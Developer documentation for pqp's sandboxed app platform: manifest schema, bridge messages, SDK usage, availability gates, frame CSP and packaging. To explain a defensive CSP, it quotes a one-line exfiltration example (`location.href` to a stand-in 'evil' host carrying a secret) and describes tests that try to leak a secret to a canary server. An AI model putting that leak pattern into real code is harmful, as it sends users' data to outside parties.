# Apps

An app is a small interactive thing, a poll or a game room, that someone starts in a text or voice channel and others join. The platform owns everything around it (launcher, card, presence line, permissions, moderation); the app itself is a sandboxed bundle that talks to the page through a narrow message API.

This page covers the part that exists so far: the manifest every app ships, its validator, the presence line, and the bridge contract.

## The manifest

Every version of every app is described by one JSON file, `manifest.json`. An author writes the source shape (no hashes); the packager hashes the bundle and writes the built shape, which the server stores as it is and never takes from a client.

Fields, in the order they appear:

| Field | Meaning |
|---|---|
| `manifestVersion` | Version of the manifest format. Always `1` for now. |
| `id` | Permanent, globally unique app id (lowercase letters, digits, hyphens, 3 to 32 characters). Never reused. Ids starting with `pqp-` belong to the first-party publisher. |
| `version` | Semantic version of this build, without `+build` metadata (two builds that differ only there would be one version to SemVer but two strings to the pin). Two builds with the same id and version must be byte-identical. |
| `publisher` | The publisher that owns the id. `pqp` is first-party. |
| `platformApi` | Version of the sandbox message API the app is written against. Only `1` exists. |
| `name`, `description` | i18n keys for the display name and the one-line launcher description. |
| `icon` | One icon id from the pqp set (`APP_ICON_IDS`). Never an upload or a URL. |
| `category` | `game`, `tool` or `emulator`. `emulator` gets extra review and is first-party only. |
| `channelTypes` | Where the app can start: `text`, `voice`, or both. |
| `players` | `min`, `max` (players above it become spectators when `spectators` is true, otherwise the join is refused) and `maxSpectators` (default 50). |
| `requires` | Permission to start (`USE_APPS` or `MANAGE_CHANNELS`) and to join (`VIEW_CHANNEL` or `CONNECT`). |
| `capabilities` | What the app asks of the platform, shown in the join sheet. See below. |
| `hostBound` | When true the session's truth lives on the host's machine, so it ends after the host-gone grace instead of passing the host role on. |
| `state` | `maxBytes` of shared session state (0 to 16384), `maxWritesPerSecond` (1 to 10, default 10) and `writers` (`host` or `participants`, default `participants`). |
| `events` | Ephemeral relay limits per participant: `maxPerSecond` (0 to 20) and `maxBytes` (0 to 1024). |
| `presence` | i18n keys of the status line for someone in the app: `phrase` (has one `{name}`) and `short` (no placeholder). |
| `content` | `userText` and `userImages`: whether participants put content in the app that other people see. Drives the community lock. |
| `notice` | Optional i18n key of one line shown in the join sheet. |
| `entry` | `path` of the entry HTML in the bundle, plus `sha256` in the built shape. |
| `assets` | Optional big files the page hands to the sandbox on request: `name`, `path`, and in the built shape `sha256` and `bytes`. |
| `sandbox` | Optional narrow knobs over the fixed CSP: `wasm` (adds `wasm-unsafe-eval`), `blobWorkers` (adds `worker-src blob:`; not needed by Locadora, kept for apps that run their own workers, reviewed) and `localBlobs` (adds `connect-src blob:` only, never the network). There is no free-text CSP and no network knob. |
| `platforms` | Where it runs: `web`, `desktop`, `ios`, `android`. Default `web` and `desktop`. |
| `license` | `spdx` expression, `source` URL (https) and an optional `notices` path. |
| `store` | Optional listing fields: `summary`, `screenshots` (path, alt, and a hash in the built shape), `homepage`, `support`. |
| `i18n` | Strings for `pt-BR`, `en` and `es`, all three required. Plain text, 240 characters at most per value. |

Capabilities:

| Capability | Values |
|---|---|
| `identity` | `display` (name, avatar and a random per-session seat id) or `user-id` (also a stable per-app derived id, only for people who consent). |
| `share` | `none`, or `pane` to let the host screen-share the app pane (voice channels only). |
| `localFiles` | `allowed`, and when allowed the `accept` extensions and a `maxBytes`. The page opens the picker and reads the bytes; the file name never crosses and nothing is uploaded. |
| `peer` | `none` or `datachannel`. Only `none` is accepted on `platformApi` 1. |

## Rules beyond the schema

`validateAppManifest` runs the schema and then these rules. Each failure has a stable `code` and a `path`.

| Code | Rule |
|---|---|
| `players-range` | `players.max` is at least `players.min`. |
| `i18n-missing-key` | Every referenced key (name, description, notice, both presence keys, store summary, screenshot alt) exists in pt-BR, en and es. |
| `presence-placeholder` | `presence.phrase` has exactly one `{name}` and no other braces, in every locale. |
| `presence-short-placeholder` | `presence.short` has no `{`, in every locale. |
| `em-dash` | No i18n value contains an em dash. |
| `pt-br-voce` | No pt-BR value uses the word "você" or "voce" (pqp speaks "tu"). |
| `publisher-reserved-id` | An id starting with `pqp-` requires publisher `pqp`. |
| `publisher-emulator` | Category `emulator` requires publisher `pqp`. |
| `peer-unsupported` | `capabilities.peer` is `none` while `platformApi` is 1. |
| `local-files-accept-required`, `local-files-max-bytes-required` | When `localFiles.allowed` is true, `accept` and `maxBytes` are present. |
| `local-files-unexpected` | When it is false, they are absent. |
| `share-needs-voice` | `share: "pane"` requires `voice` in `channelTypes`. |
| `state-writers-no-state` | `state.writers: "host"` with `state.maxBytes: 0` has nothing to write. |

Schema failures use `schema-unknown-key`, `schema-required`, `schema-type`, `schema-enum`, `schema-format`, `schema-range` and `schema-unique`.

## The presence line

`formatAppPresence(template, displayName)` puts a person's name into the app's translated phrase ("Raf tá na Locadora"). The name is untrusted text a stranger typed, so control characters and bidi override and isolate characters are removed, it is trimmed and capped at 32 characters, and the substitution is a plain splice: `$&` stays literal and a name containing `{name}` is not expanded. An empty name becomes `?`. `resolveAppPresence(manifest, locale, displayName)` picks the locale (exact, then base language, then English) and returns the `phrase` for places where the line stands alone and the `short` for places under a name that is already shown.

## The bridge

The bridge is the message API (v1, `APP_PLATFORM_API = 1`) between the pqp page, the host, and a sandboxed app frame. The app is untrusted. Contract: `packages/shared/src/apps/bridge.ts`. The WebSocket frames between the pqp client and the API are in `packages/shared/src/apps/frames.ts` and are not part of the chat unions yet.

### Handshake

Two messages travel on `window.postMessage`, nothing else does:

1. The app posts `{ pqp: "app-hello", platformApi: 1 }` to its parent.
2. The host answers `{ pqp: "app-port", platformApi: 1 }` and transfers one end of a `MessageChannel`.

The frame is an opaque origin, so there is no origin to compare. The host checks `event.source === iframe.contentWindow` and ignores every other message. The app checks that the port message came from `window.parent`. Everything after that is on the port.

**Strict toward the less trusted side, tolerant toward a newer peer.** Messages from the app (`app-hello`, every request) and client to server frames are strict: an unknown key is a rejection. Messages to the app (`app-port`, responses, pushes) and server to client frames use zod's default strip: an unknown key is dropped, never passed through. A field added later therefore does not make an app pinned to platform API 1, or an older client, reject the whole message, and a stripped key can never reach the app.

### App to host (requests, `{ id, type, ...params }`, `id` 1 to 32 characters)

- `participants.get`: the current participant list.
- `state.get`: the session state and its revision.
- `state.patch { patch, baseRev? }`: a JSON Merge Patch (RFC 7396) over the state. `baseRev` makes it conditional.
- `events.send { name, data }`: an ephemeral event for the others. `name` matches `/^[a-z][a-z0-9.-]{0,31}$/`.
- `assets.get { name }`: the bytes of one of the manifest's `assets[]`, checked by the host.
- `files.pickLocal`: the host opens the picker (the manifest decides accept list and size cap) and transfers the bytes. The file name never crosses: the answer is `{ bytes, ext }`, where `ext` is the lower-cased extension with its dot, taken from the manifest's accept list.
- `ui.resize { height }`: 120 to 2000 pixels.
- `ui.fullscreen { on }`
- `share.request { on }`: share the app pane through pqp's own flow (apps whose manifest allows it).
- `session.end`: host only.

### Host to app

Responses carry the request `id`, and a successful one also echoes the request `type`, so its `result` is read as the answer to that call and never guessed from its shape. A call with nothing to return (`events.send`, `session.end`) answers `result: null`: `{ id, ok: true, result }` or `{ id, ok: false, error }`, with `error` one of `not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`.

Pushes have no id:

- `hello`: platform version, app id and version, locale, theme, reduced motion, `self` (seat, role, host), connection. Sent once after the port is handed over.
- `participants`: seat id, display name, avatar as a data URL (or null), role, host flag, `connection` (`present`, or `reconnecting` while the seat is held for its 90 second resume window), and `appUserId` only for people who consented. The same `connection` field is on the participants of `participants.get`, of the `app-session` frame and of the `channel-app` summary.
- `state { rev, value }`
- `event { fromSeatId, name, data }`
- `connection { status }`: `online` or `reconnecting`.
- `session.ended { reason }`: one of the `end_reason` values of the data model.
- `theme { theme }`: up to 64 CSS custom properties.

### Caps

| What | Cap |
|---|---|
| State patch and state value | 16384 bytes serialized (`APP_STATE_MAX_BYTES`) |
| Event payload | 1024 bytes serialized (`APP_EVENT_MAX_BYTES`) |
| Events per participant | 20 per second (`APP_EVENT_MAX_PER_SECOND`) |
| State writes per session | 10 per second, coalesced (`APP_STATE_MAX_WRITES_PER_SECOND`) |
| JSON nesting | 32 levels |
| Participants in one push | 264 |
| Avatar data URL | 65536 characters |
| Avatars in one participant list | 4 MiB of characters in total (`APP_PARTICIPANTS_AVATAR_BUDGET_CHARS`); the host downsizes avatars until the list fits |
| Display name | 64 characters |

JSON values must survive `JSON.stringify` unchanged: no `undefined`, functions, `NaN`, `Infinity`, class instances or holes in arrays. Sizes are UTF-8 bytes of the serialized value, enforced by the schemas themselves.

### What the app never sees

A pqp user id, an email, a token, a server id or a channel id. It gets a display name, an avatar as a data URL, a random per-session seat id (16 to 32 characters of `A-Za-z0-9_-`), and, for people who ticked the consent box only, a per-app derived id. `bridge.test.ts` walks every bridge schema and fails if a key named `userId`, `user_id`, `email`, `token`, `serverId` or `channelId` appears on it. The WebSocket frames may carry user ids, because the page needs them to draw avatars; the page strips them before anything reaches the app.

## Writing an app

An app is a small web bundle that runs in a sandboxed frame (no network, no storage, an opaque origin) and talks to the pqp page through `@pqp/app-sdk`. The SDK has no runtime dependencies and does the handshake for you.

```ts
import { applyTheme, connect, PqpAppError } from "@pqp/app-sdk";

const app = await connect(); // app-hello / app-port, then the host's hello
applyTheme(app.hello.theme);
app.on("theme", applyTheme);

const label = document.querySelector("#count")!;
const render = ({ value }: { value: unknown }) => {
  label.textContent = String((value as { count?: number } | null)?.count ?? 0);
};
app.state.on(render); // register right after connect...
render(await app.state.get()); // ...and read the current value with get()

document.querySelector("#plus")!.addEventListener("click", async () => {
  const { rev, value } = await app.state.get();
  try {
    await app.state.patch({ count: ((value as { count?: number } | null)?.count ?? 0) + 1 }, { baseRev: rev });
  } catch (error) {
    if (!(error instanceof PqpAppError) || error.code !== "stale-rev") throw error; // somebody was faster: ignore
  }
});
app.events.on("ping", ({ data }) => console.log("ping from", data));
await app.events.send("ping", { hello: true });
```

What to know:

- `connect()` resolves with the app once the host's `hello` arrived (`app.hello`: platform version, app id and version, locale, theme, `self`). It rejects with `unavailable` when pqp does not answer in 15 seconds, and at once when the page is not inside a pqp frame. Call it once; a second call returns the same promise.
- Listeners (`participants.on`, `state.on`, `events.on(name, cb)`, `app.on("connection" | "theme" | "ended", cb)`) return an unsubscribe function. Register them right after `connect()` and use the `get` calls for the value from before. A push that arrives before a listener exists is not replayed.
- Every call returns a promise and rejects with a `PqpAppError` whose `code` is one of the bridge's codes (`not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`). A call the host does not answer within 15 seconds rejects with `unavailable`. After `ended` every call rejects with `ended`. A success the host sends must echo the request's `type` and carry the fields of its call (`events.send` and `end` answer `result: null`); a reply that names another call, omits the type or has a field of the wrong kind rejects with `unavailable`, so a write never looks done on the strength of someone else's answer.
- `events.send` and `end` resolve to `null`. `files.pickLocal()` resolves to `{ bytes, ext }`, or `null` when the person cancels. `assets.get(name)` resolves to an `ArrayBuffer` the host already checked against the manifest's hash.
- The app sees seat ids, display names and avatar data URLs, never pqp user ids. State is a JSON Merge Patch over one JSON value of at most 16 KB, events are at most 1 KB, and the manifest can lower both caps.
- Theme: the host sends up to 64 CSS custom properties. `applyTheme(theme)` writes them on the document element through the CSSOM, which the frame's `style-src 'self'` allows.

## Availability

An app may run in a place only when every gate holds. `appAvailability(serverId, appId, { channelType })` in `server/src/apps/availability.ts` answers `{ available, reason }`, and `reason` is the FIRST gate that fails, in this order:

| Reason | Gate |
|---|---|
| `flag-off` | The runtime flag `apps` is off for the server. |
| `not-live` | `apps.status` is not `live`, or the app has no current version. |
| `global-off` | `apps.global_enabled` (the operator's master switch) is off. |
| `not-allowed-here` | `server_apps.operator_enabled` is not TRUE for this server. |
| `owner-off` | The server's owner set `server_apps.owner_enabled` to FALSE. The owner can only remove what the operator allowed. |
| `community-locked` | The server is a public community (`servers.is_community`) and the app has no `community_unlocked` safety decision. |
| `emulator-off` | `category: "emulator"` also needs the flag `emulator_room` on the server. |
| `channel-type` | The channel's type (`text` or `voice`) is not in the manifest's `channelTypes`. |
| `no-origin` | The deployment has no `APPS_ORIGIN`, so no app can run. |

D14: `appShareAllowed(serverId, app)` is true for every app except `category: "emulator"`, which also needs the flag `locadora_share` on the server (per server, default off, waiting for the lawyer's answer). The config carries it as `shareAllowed` and the session engine refuses `share.request` and spectator joins without it.

### The apps origin

`APPS_ORIGIN` names the separate, cookieless site that serves bundles (hosted: `https://pqp-apps.pages.dev`, local: `http://localhost:5175`). Unset, the config answers `origin: null` and every app is `no-origin`. Bundle addresses are `<origin>/<id>/<version>/<path>`, built by the server from the stored manifest, never from a request.

### The catalog

`server/src/apps/catalog.json` (`{ "apps": [ { "manifest": <built manifest>, "manifestSha256": "<hex>" } ] }`, written by the packager) is merged into `apps` and `app_versions` at boot by `loadAppCatalog`, on the API and the worker. The merge is insert-only: a new app arrives as `draft`, off everywhere, and a new version as `pending` review; the same (id, version) with a different `manifestSha256` is refused with a loud log; nothing ever changes the status, switches, review fields or `current_version` of an existing row, except that an app with no `current_version` gets the newest version the load inserted. Every insert writes an `app_admin_audit` row (`catalog-load`). The build copies the file into `dist/apps/`.

On a dev box only (`DEV_AUTH_BYPASS=true` and `NODE_ENV` not `production`) apps of the `pqp` publisher are made `live`, `global_enabled` and `community_unlocked` at load, and the dev seed releases them on its Sandbox server, so a local checkout needs no dashboard. Turn the platform itself on with `APPS=true` in `.env`, and set `APPS_ORIGIN`.

### The config route

`GET /api/apps/config?serverId=` (member of the server, otherwise 404) answers `{ enabled, origin, apps }`, typed by `appsConfigSchema` in `packages/shared/src/apps/config.ts`. With the flag off, or with no `serverId`, it is `{ enabled: false, origin: null, apps: [] }`. Each `live` app is listed with `available` and `reason`, the entry and asset URLs, `shareAllowed`, and only the i18n keys a client draws (name, description, notice, presence) in all three locales.

### Who may start

`USE_APPS` is on `@everyone` of every server created from now on (`PERMISSION_NEW_SERVER_EVERYONE`), and on the moderator, manager and admin staff roles, which is what a new server is seeded with. It is not in `PERMISSION_DEFAULT_EVERYONE`, so a community only has it when its owner grants it.

## The frame host (web client)

The pqp page runs an app in a sandboxed frame and is the only thing that talks to it. Code: `client/src/lib/apps/` (logic) and `client/src/components/apps/app-frame.tsx` (the React wrapper).

- **`AppFrame`** renders a wrapper `div` (`data-status` is `loading`, `ready`, `error` or `ended`) and `mountAppFrame` (`lib/apps/frame-controller.ts`) puts one `<iframe sandbox="allow-scripts" allow="" referrerpolicy="no-referrer">` in it. Props: `app` (an entry of `GET /api/apps/config`, as `AppRuntimeConfig`), `appsOrigin`, `transport`, `users`, `title`, `locale`, `asSpectator`, `onStatus`, `onShare`. `onStatus` gets `{ kind: "loading" | "ready" }`, `{ kind: "error", reason, code? }` (`bad-entry`, `join-failed` with the transport's code, `timeout`, `frame-navigated`, `flood`) or `{ kind: "ended", reason }`. The seat is taken on mount and released on unmount.
- **`AppSessionTransport`** (`lib/apps/types.ts`) is the whole interface to the server: `join`, `leave`, `patchState`, `sendEvent`, `end`, `subscribe` (handlers `onSession`, `onState`, `onEvent`, `onConnection`, `onEnded`). It maps one to one onto the `/ws` frames of `packages/shared/src/apps/frames.ts` and `POST /api/app-sessions/:id/end`. Participant changes reach the host as a fresh `app-session` snapshot (`onSession`): it is the only frame that carries seat ids next to user ids, so a roster change must be delivered to participants that way.
- **The bridge host** (`lib/apps/bridge-host.ts`) parses every message with `bridgeAppMessageSchema` (strict: a failure is answered `invalid`, or dropped when it has no usable id), enforces the manifest again (event rate and bytes, state bytes counted on the MERGED state, who may write, `share` only for a `pane` app where sharing is allowed, `files.pickLocal` only when files are allowed), maps `AppTransportError` codes to bridge errors, builds participants from scratch (a seat id, a cleaned display name, an avatar data URL of at most 65536 characters or null, never a user id; one list holds at most 4 MiB of avatars, so past that the largest are left out and the app draws its fallback) and passes every answer and push through the bridge schemas (a successful answer echoes the request `type`). A flood is answered `rate-limited` without parsing and ends the frame if it keeps going.
- **Files and assets.** `files.pickLocal` creates an `<input type=file>` in the PAGE (`accept` and the size cap from the manifest), reads the file and answers `{ bytes, ext }`; the file name is read once to find the extension and goes nowhere. `assets.get` fetches the manifest's asset with `cache: "force-cache"`, only from the apps origin (an asset URL anywhere else is refused without a request, and a redirect is an error), reading the body with the declared size as a hard limit, then checks the sha256 with `crypto.subtle` and transfers a copy; a mismatch answers `unavailable` and logs once, and concurrent requests for one asset share one fetch. Avatars are fetched only from `avatarOrigins` (the page's own origin and the API's; a user can set their avatar URL to anything), with a byte limit, a few at a time, and not at all once a roster's 4 MiB is spent.
- **Theme.** `hello` and `theme` carry up to 64 CSS custom properties: an allowlist of the design tokens of `docs/DESIGN.md` (surfaces, borders, text, accent, status and soft pairs, radii, fonts, `--color-focus-ring`) read as the browser resolved them, plus `--pqp-color-scheme` (`light` or `dark`). A change of brightness, skin, contrast or accent hue pushes `theme` again. `reducedMotion` is the OS setting.
- **Keyboard.** The frame is one tab stop and the page never traps focus or captures Escape; an app that traps focus fails review. `AppFrameHandle.focus()` puts focus on the frame from outside.

**Why the page carries a CSP at all.** CSP inside the frame cannot stop a frame from navigating ITSELF (`location.href = "https://evil/?" + secret`, `<meta http-equiv=refresh>`, an anchor click): it is a navigation, and `navigate-to` does not exist. The only control is the embedding page's `frame-src` (S0 spike). pqp.gg has no CSP and a site-wide header is a bigger decision, so when the first app frame mounts the page inserts `<meta http-equiv="Content-Security-Policy" content="frame-src 'self' blob: <apps origin> <every origin the client frames>">`: `lib/apps/frame-policy.ts`. It carries `frame-src` only, so it constrains nothing else, and it stays for the life of the page. The origins are YouTube (`www.youtube.com`, `www.youtube-nocookie.com`), Twitch (`player.twitch.tv`, `clips.twitch.tv`), TikTok, Instagram, and Cloudflare Turnstile. Not Google sign-in (One Tap) and not Clerk's host: their flows carry a `state` or redirect parameter to a destination somebody else registered, which would let a navigating app frame hand data to it; a deployment that frames more passes it as an extra origin. Never a wildcard on a multi-tenant domain. `frame-policy.test.ts` checks every embed URL the shared builders produce against the list and fails when a new source file renders an iframe. The host also removes the frame on a second `load` event (it left the document it was given) and after 20 seconds without a `hello`. Both are in `client/e2e/app-frame/`, which runs the real controller, host and SDK in a sandboxed frame under the production CSP against a canary server, in Chromium, WebKit and Firefox: without the policy all three engines deliver `?secret=1` to the canary, with it none does, for `location.href`, `location.replace`, `location.assign`, `<meta refresh>` and an anchor click.

Residual: the policy is page-wide, so a listed origin is also a place a hostile frame can send a query string to (with whatever the app was told). The listed embed hosts have no redirect to a destination the sender picks, so that data lands in a vendor's logs, not with the app's author. A structural fix (the app frame in a wrapper document whose `frame-src` is the apps origin alone) is a follow-up decision. WebKit opens a TCP connection for `<link rel=preconnect>` despite the CSP (S0 finding d).

Run the browser suite with `pnpm --filter @pqp/client e2e:app-frame` (CI runs Chromium and Firefox; add `--project=webkit` locally).

## Packaging

First-party apps live in the repository, one folder each under `apps/<name>/` (a pnpm workspace folder). `tools/apps-build/` builds them and writes everything the platform needs to serve and trust a bundle.

An app folder holds `manifest.source.json` (the manifest an author writes, validated with `appManifestSourceSchema`, so no hashes), a Vite app (`index.html`, `src/`) and its own `package.json` depending on `@pqp/app-sdk`. The entry page is `index.html`. Eco (`apps/eco/`, id `pqp-eco`) is the internal test app: a participant list with avatars, a counter in the session state, a ping event. It is `draft` until an operator turns it on; with `DEV_AUTH_BYPASS` the dev seed turns it on for the Sandbox hall only.

| Command | What it does |
|---|---|
| `pnpm apps:build` | Builds every app into `dist-apps/<id>/<version>/`, writes `dist-apps/_headers` and `server/src/apps/catalog.json`. |
| `pnpm apps:check` | Builds into a scratch folder and fails when the committed `catalog.json` differs (the lockfile pattern), or when a released version would change its bytes. Runs in CI. |
| `pnpm apps:dev` | Builds, serves `dist-apps` on `http://localhost:5175` with the same `_headers` rules (cache disabled) and rebuilds when `apps/` or `packages/app-sdk/src/` change. `APPS_DEV_PORT` moves it. |

What a build does, per app:

1. Vite build with a deterministic output: fixed file names (`index.js`, `index.css`, no content hash in a name, because the version folder is already immutable), no source maps, no module preload shim, nothing inlined. Same sources and same toolchain give the same bytes; a test builds twice and compares every hash. The Vite version is pinned exactly.
2. The entry page gets Subresource Integrity (`sha384`) and `crossorigin` on every script and stylesheet. The build fails on anything the frame's CSP would silently refuse: an inline `<script>` or `<style>`, a `style=` attribute, an `on*=` handler, `<base>`, `<meta http-equiv>`, a nested frame, or any reference that is not a relative path inside the bundle.
3. Every file is hashed. The built manifest is the source plus `entry.sha256`, and for each `assets[]` entry `sha256` and `bytes`, read from the built file (same for `store.screenshots[]`). It is validated with `validateAppManifest` before anything is written.
4. `dist-apps/_headers`, one rule per `/<id>/<version>/*`: the frame's Content-Security-Policy, `Cache-Control: public, max-age=31536000, immutable`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cross-Origin-Resource-Policy: cross-origin` and `Access-Control-Allow-Origin: *`. CORS is on the whole bundle, not only on `assets[]`: the frame is an opaque origin, so it fetches its own module script and its SRI-protected stylesheet in CORS mode, and without the header Chromium refuses both ("origin 'null' has been blocked by CORS policy"). The files are the public, open-source bundle, so nothing is exposed.
5. The CSP is the one in PLAN D5 as amended by the S0 spike: `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self'; media-src blob:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors <pqp origins>`. Only the manifest's `sandbox` knobs widen it: `wasm` adds `'wasm-unsafe-eval'` to `script-src`, `localBlobs` makes `connect-src` `blob:`, `blobWorkers` adds `worker-src blob:`. `'unsafe-eval'`, `script-src blob:` and `data:` in `connect-src` are never emitted.

`server/src/apps/catalog.json` is `{ "apps": [ { "manifest": <built manifest>, "manifestSha256": "<hex>" } ] }`, sorted by id then version. `manifestSha256` is the sha256 of the built manifest's canonical JSON (every object's keys sorted, no whitespace), so it does not depend on key order. The server loads it at boot, insert-only.

**Versions are immutable.** The build compares with the catalog on `origin/main`: an `(id, version)` that is already there must come out with the same `manifestSha256`, or the build fails with "bump the version". The manifest hash covers `entry.sha256`, which covers the SRI of the script and stylesheet, so any change to an app's code, or to `@pqp/app-sdk` (it is bundled into every app), is a changed version. A fork or a clone without `origin/main` skips this check with a warning; CI requires it. After a release, change an app by bumping `version` in its `manifest.source.json`.

**Deploy.** `.github/workflows/deploy-apps.yml` runs on a push to `main` that touches `apps/`, `packages/app-sdk/` or `tools/apps-build/`, builds and publishes `dist-apps` with `wrangler pages deploy` to the Pages project named by the repository variable `APPS_PAGES_PROJECT` (hosted: `pqp-apps`, served at `https://pqp-apps.pages.dev`). With the variable empty the job skips cleanly. The API finds the bundles through `APPS_ORIGIN` (dev `http://localhost:5175`, unset means apps cannot run). A Pages deploy replaces the whole site, so a version that is no longer built from `apps/` stops being served; a session pinned to it (at most 12 hours old) cannot load the frame for a late joiner. Keep a released version buildable until its last session is over, or accept that.

## Where things live

- The frame host: `client/src/lib/apps/` (`bridge-host.ts`, `frame-controller.ts`, `frame-policy.ts`, `types.ts` for the transport interface), `client/src/components/apps/app-frame.tsx`; browser suite `client/e2e/app-frame/`.
- The packager: `tools/apps-build/` (`bundle.mts` builds one app, `html.mts` SRI and the entry page rules, `headers.mts` CSP and `_headers`, `catalog.mts` the catalog and immutability, `dev-server.mts`, `cli.mts`). Apps: `apps/<name>/`. Output: `dist-apps/` (git-ignored); the committed result is `server/src/apps/catalog.json`.
- The SDK: `packages/app-sdk/` (`@pqp/app-sdk`). `connect()` in `connect.ts`, the request and push plumbing in `client.ts`, the public object in `app.ts`. Tests use a fake host on a real `MessageChannel` (`fake-host.fixture.ts`).
- Zod schemas, validator and constants: `packages/shared/src/apps/manifest.ts`
- Presence formatter: `packages/shared/src/apps/presence.ts`
- Bridge contract: `packages/shared/src/apps/bridge.ts`; WebSocket frames: `packages/shared/src/apps/frames.ts`; shared JSON, seat id and end reason pieces: `common.ts`; roster and JSON caps beyond the manifest's: `limits.ts`
- JSON Schema for third parties: `packages/shared/schemas/app-manifest-1.schema.json`
- Fixtures: `packages/shared/fixtures/app-manifests/` (`valid-*`, `invalid-schema-*` rejected by both schemas, `invalid-rule-*` accepted by the JSON Schema and rejected by the validator)
- Tests: `packages/shared/src/apps/*.test.ts`. The parity test runs both schemas over every fixture, so the JSON file and the zod schema cannot drift apart. Change one, change the other, add a fixture.
- Availability, catalog, config: `server/src/apps/{availability,catalog,config,origin}.ts`, route in `server/src/api/app-routes.ts`, client contract `packages/shared/src/apps/config.ts`
